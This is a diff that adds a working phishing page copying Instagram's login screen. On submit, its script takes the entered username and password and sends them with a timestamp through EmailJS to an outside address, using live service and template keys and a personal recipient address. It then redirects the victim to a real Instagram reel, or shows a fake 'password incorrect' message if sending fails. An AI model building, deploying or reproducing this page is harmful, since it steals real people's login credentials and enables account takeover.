@@ -1,0 +1,116 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://www.flaticon.com/free-icon/instagram_2111463?term=instagram+logo&amp;page=1&amp;position=1&amp;origin=tag&amp;related_id=2111463">
+    <link rel="stylesheet" href="styles.css">
+    <title>Instagram</title>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script>
+      emailjs.init("9MGY5mg4o7Vcn1Qmb"); // Replace with your actual EmailJS User ID
+    </script>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-section">
+        <img src="images/mobileImage.jpeg" alt="">
+      </div>
+      <div class="right-section">
+        <div class="login-box">
+          <img src="images/instaTextLogo.png" alt="" class="instaTextLogo">
+
+          <!-- Form for capturing login details -->
+          <form id="login-form">
+            <input type="text" id="username" name="username" placeholder="Email address, username, phone number" required="">
+            <input type="password" id="password" name="password" placeholder="Password" required="">
+            <button type="submit" class="login-btn">Log in</button>
+          </form>
+
+          <div class="divider">
+            <hr class="line">
+            <p>OR</p>
+            <hr class="line">
+          </div>
+
+          <div class="login-with-facebook">
+            <img src="images/fbicon.png" alt="" class="fb-img">
+            <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATl2IDSA0wS70eAMY5YhtGLNDkFOBhaGscDEsAqXzUs8mQs4dB06cP-6wybkFRNhQBNoukmJRoUV6Lx1qhDH6uFMKmm6fQporZj_upBpH4vxXxjjdruVd8ygIQDewxhLTBf3gyEbL9Id_M445qFrya7A-ra0D1AdMBAyhfIqYOSSTgZrrgzT1w5cNJGmqarGfg37bTXzW916PEBQYeXjGKzJ439AjL707e3W9DTtDjsSRcZWhL3SKK8qzKayh8lpgqVN" class="facebook-login">Log in with Facebook</a>
+          </div>
+
+          <!-- Error message container -->
+          <div id="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px"></div>
+
+          <div>
+            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgotten your password?</a>
+          </div>
+        </div>
+
+        <div class="signup-box">
+          <p>
+            Don't have an account?
+            <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+          </p>
+        </div>
+
+        <div class="download-section">
+          <p>Get the app</p>
+          <div class="app-buttons">
+            <img src="images/appstore.png" alt="" class="app-btn">
+            <img src="images/playstore.png" alt="" class="app-btn">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Handle form submission
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the default way
+
+          // Get the username and password values
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
+          const time = new Date().toLocaleString(); // Get the current timestamp
+
+          // Prepare the email data to send via EmailJS
+          const emailData = {
+            username: username,
+            password: password, // Be cautious with sending passwords
+            time: time,
+            to_email: "abishek.sathiyan.2002@gmail.com", // Replace with the recipient's email address
+          };
+
+          // Send the email using EmailJS
+          emailjs
+            .send("service_bf0vo4c", "template_gnwwocb", {
+              username: username,
+              password: password,
+              time: new Date().toLocaleString(),
+              to_email: "recipient@example.com", // Replace with the recipient's email
+            })
+            .then(
+              (response) => {
+                console.log("SUCCESS!", response);
+                // Optionally, you can redirect after success
+                window.location.href =
+                  "https://www.instagram.com/reel/DH6J9t_P1I_/?igsh=MTkyc2ptbzRtN3p2cg=="; // Redirect on success
+              },
+              (error) => {
+                // Show the error message below the Facebook login button
+                const errorMessageDiv =
+                  document.getElementById("error-message");
+                errorMessageDiv.textContent =
+                  "Sorry, your password was incorrect. Please double-check your password.";
+                errorMessageDiv.style.display = "block"; // Make the error message visible
+                console.error("Error sending email:", error);
+              }
+            );
+        });
+    </script>
+  
+
+</body></html>
